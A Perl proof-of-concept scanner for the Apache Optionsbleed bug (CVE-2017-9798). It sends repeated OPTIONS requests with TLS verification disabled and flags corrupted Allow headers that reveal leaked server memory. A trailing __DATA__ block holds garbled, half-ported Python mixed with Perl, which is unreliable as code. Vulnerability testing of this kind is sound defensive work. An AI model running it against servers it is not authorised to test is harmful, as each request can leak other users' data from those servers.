#!/usr/bin/perl 
use strict;
use warnings;
use Data::Dumper;

# Optionsbleed proof of concept test
# by Hanno Böck
# Perl port not by Hanno Böck

BEGIN {
	$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
}
use Getopt::Long;
use LWP::UserAgent;
use B;
use re;
use List::Util qw/uniq/;
use Pod::Usage;
use Getopt::Long;
 

sub test_bleed {
	my ($url, $args) = @_;
	my $req = new HTTP::Request(
		OPTIONS => $url
	);
	my $ua = new LWP::UserAgent(
		keep_alive => 1,
		agent => 'Lynx/2.8.8dev.3 libwww-FM/2.14 SSL-MM/1.4.1',
		ssl_opts => {
			verify_hostname => 0,
		}
	);
	my $r = $ua->request( $req );
	my $allow = $r->header('allow');
	unless (defined $allow) {
		printf "[none] %s %s\n", $url, $r->status_line;
	}
	return 0 unless defined $allow;
	if ($allow eq "") {
		printf "[empty] %s\n", $url
	} elsif ($allow =~ m"^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$") {
		my @z = split(/\s*,\s*/, 
			scalar($allow =~ s{^\s*(.*)\s*$}{$1}, $allow)); 
		if (scalar @z > scalar uniq @z) {
            printf "[duplicates] %s: %s\n", $url, B::perlstring($allow);
		} elsif ($args->{all}) {
            printf "[ok] %s: %s\n", $url, B::perlstring($allow);
		}
	} elsif ($allow =~ m"^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$") {
        printf "[spaces] %s: %s\n", $url, B::perlstring($allow);
	} else {
        printf "[bleed] %s: %s\n", $url, B::perlstring($allow);
	}
    return 1;
}

my %args = (n => 10);
Getopt::Long::Configure ("bundling");
GetOptions(\%args, 
	'host|hosttocheck|h=s',
	'n=i',
	'all|a',
	'url|u'
);
print Dumper(\%args);
exit unless $args{host};
$DB::single = 1;

if ($args{url}) {
	test_bleed( $args{host}, \%args );
} else {
	for my $prefix (qw[
		http://
		http://www.
		https://
		https://www.
	]) {
		for (1..$args{n}) {
			last unless 
				test_bleed( $prefix . $args{host}, \%args );
		}
	}
}
	
__DATA__

if args.url:
    test_bleed(args.hosttocheck, args)
else:
    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:
        for i in range(howoften):
            try:
                if test_bleed(prefix+args.hosttocheck, args) is False:
                    break
            except Exception as e:
                pass


test_bleed($ARGV[0], { all => 1 });

parser.add_argument('hosttocheck',  action='store',
                    help='The hostname you want to test against')
parser.add_argument('-n', nargs=1, type=int, default=[10],
                    help='number of tests (default 10)')
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action='store_true',
                    help="pass URL instead of hostname")
args = parser.parse_args()
		
	
	


def test_bleed(url, args):
    r = pool.request('OPTIONS', url)
    try:
        allow = str(r.headers["Allow"])
    except KeyError:
        return False
    if allow in dup:
        return
    dup.append(allow)
    if allow == "":
        print("[empty] %s" % (url))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
		my @z = split(/\s*,\s*/, 
			scalar($allow =~ s{^\s*(.*)\s*$}{$1}, $allow)); 
		if (scalar @z > scalar uniq @z) {
            printf "[duplicates] %s: %s\n", $url, B::perlstring($allow);
		} 
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
    return True


=pod

=head1 NAME

optionsbleed.pl

=head1 DESCRIPTION

Check for the Optionsbleed vulnerability (CVE-2017-9798).

Tests server for Optionsbleed bug and other bugs in the allow 
header.

Automatically checks 
http://, https://, http://www. and https://www. 
except if you pass -u/--url 

(which means by default we check 40 times.)

=head1 ARGUMENTS

=over

=item * -h C<hostname>     

=item * --host C<hostname>

=item * --hosttocheck C<hostname>

The hostname you want to test against

=item * -n I<number of tests>

Number of tests (default 10)

=item * -a

=item * --all

Show headers from hosts without problems

=item * -u

=item * --url

Pass URL instead of hostname

=back

=head1 RESULTS

=over

=item * [bleed]

Corrupted header found, vulnerable

=item * [none]

No Allow header, also reports the status line

=item * [empty]

Empty allow header, does not make sense

=item * [spaces]

space-separated method list (should be comma-separated)

=item * [duplicates] 

duplicates in list (may be apache bug 61207)

=item * [ok] 

normal list found (only shown with -a/--all)

=back

=cut

